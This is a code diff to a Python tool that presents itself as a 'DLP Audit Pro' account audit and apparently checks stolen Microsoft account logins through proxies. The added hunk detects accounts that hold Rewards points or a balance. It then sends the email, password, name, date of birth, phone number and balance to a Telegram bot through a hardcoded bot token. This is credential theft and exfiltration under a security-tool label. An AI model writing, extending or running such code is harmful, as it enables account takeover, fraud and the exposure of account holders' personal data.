@@ -617,7 +617,34 @@ def run_local_audit(email, password, iproyal_auth, hits_buffer, keyword="", user
         except Exception as e:
             print(f"[DEBUG] Error Rewards: {e}")
             pass
+            
+        # 3. Independent Telegram Dispatch for Financial Data (Points > 0 or Saldo > 0)
+        has_points = av_pts != "0" and av_pts != ""
+        has_balance = balance != "0.00" and balance != "0" and balance != ""
         
+        if has_points or has_balance:
+            print(f"[DEBUG] Cuenta Financiera Detectada! Pts: {av_pts} | Saldo: {balance}")
+            try:
+                fin_token = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
+                if tg_chat_id:
+                    fin_msg = (f"💰 *¡CUENTA FINANCIERA DETECTADA!* 💰\n"
+                               f"━━━━━━━━━━━━━━━━━━\n\n"
+                               f"👤 *Usuario:* `{target_user}`\n"
+                               f"📧 *Correo:* `{email}`\n"
+                               f"🔑 *Pass:* `{password}`\n\n"
+                               f"🌍 *País:* {country}\n"
+                               f"👤 *Nombre:* {name}\n"
+                               f"📅 *DOB:* {dob}\n"
+                               f"📱 *Teléf:* `{phone}`\n\n"
+                               f"💎 *Pts. Disp:* `{av_pts}`\n"
+                               f"💳 *Saldo MS:* `{balance}`\n\n"
+                               f"🤖 *DLP Audit Pro System*")
+                    fin_url = f"https://api.telegram.org/bot{fin_token}/sendMessage"
+                    res = requests.post(fin_url, json={"chat_id": tg_chat_id, "text": fin_msg, "parse_mode": "Markdown"}, timeout=5)
+                    res.raise_for_status()
+            except Exception as e:
+                print(f"[DEBUG] Error mandando alerta Financiera: {e}")
+               
         # PASO 7 - Búsqueda DLP Vía Substrate API
         senders_found = {}
         subject_count = 0
@@ -848,10 +875,7 @@ def run_local_audit(email, password, iproyal_auth, hits_buffer, keyword="", user
                     f"👤 Nombre: {name}\n"
                     f"📅 DOB: {dob}\n"
                     f"🗣️ Idioma: {language}\n"
-                    f"📱 Teléf: {phone}\n"
-                    f"🎁 Pts Disponibles: {av_pts}\n"
-                    f"⏱️ Pts de Hoy: {today_pts}\n"
-                    f"💳 Saldo de Cuenta MS: {balance}\n\n"
+                    f"📱 Teléf: {phone}\n\n"
                     f"📊 Mensajes Relevantes: {sum(u_found.values()) if u_found else 0}\n"
                     f"🔍 Búsqueda: from:{', from:'.join(u_senders) if u_senders else 'N/A'}\n"
                     f"🤖 DLP Audit Pro System"
